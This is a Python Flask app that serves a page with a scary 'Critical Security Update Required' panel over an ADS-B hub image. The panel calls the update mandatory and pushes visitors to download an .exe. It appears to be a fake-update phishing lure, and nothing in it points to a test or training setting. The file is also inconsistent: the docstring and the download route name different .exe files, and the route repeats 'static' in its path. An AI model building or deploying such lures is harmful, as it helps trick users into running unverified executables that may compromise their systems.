"""
adsb_update_flask_app.py

Minimal Flask app showing a background image and a download panel.

Requirements:
- static/adsbhub.png          → Background image
- static/latest_version.exe   → Executable file to be downloaded

Run with:
    python adsb_update_flask_app.py
"""

import os
from flask import Flask, render_template_string, send_from_directory

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Software Update Required</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      position: relative;
      overflow: hidden;
    }

    /* Background image as full-screen */
    #background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('/static/adsbhub.png');
      background-size: 100% auto; 
      background-position: top center;
      background-repeat: no-repeat;
      opacity: 0.5;
      z-index: -1;
    }

    /* Sidebar overlay panel */
    #sidebar {
      position: absolute;
      top: 50%;
      right: 5%;
      transform: translateY(-50%);
      width: 320px;
      background: rgba(255, 255, 255, 0.95);
      padding: 1.5rem;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
    }

    h2 {
      margin-top: 0;
      color: #c0392b;
    }

    p {
      line-height: 1.5;
    }

    button {
      display: block;
      width: 100%;
      padding: 0.75rem;
      font-size: 1rem;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      margin-top: 1rem;
      cursor: pointer;
    }

    button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>
  <div id="background"></div>

  <section id="sidebar">
    <h2>⚠️ Critical Security Update Required</h2>
    <p>
      The version of <strong>ADS-B-Display</strong> you are using has been identified as
      <strong style="color:#c0392b;">vulnerable</strong> to severe security threats.
    </p>
    <p>
      Continuing to use this version may expose your system to <strong>unauthorized access,
      data leaks, or system compromise</strong>.
    </p>
    <p>
      To ensure your data remains safe and your system stays protected, it is <strong>mandatory</strong>
      to update to the latest version immediately.
    </p>
    <form action="/download" method="get">
      <button type="submit">Download Latest Version Now</button>
    </form>
  </section>
</body>
</html>
"""

@app.route("/")
def index():
    """Serve the main page with the background and update panel."""
    return render_template_string(HTML_PAGE)


@app.route("/download")
def download():
    """Send the latest .exe file from the static directory."""
    filename = "static/ADS-B-Display-latest.exe"
    static_dir = os.path.join(app.root_path, "static")
    return send_from_directory(static_dir, filename, as_attachment=True)


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
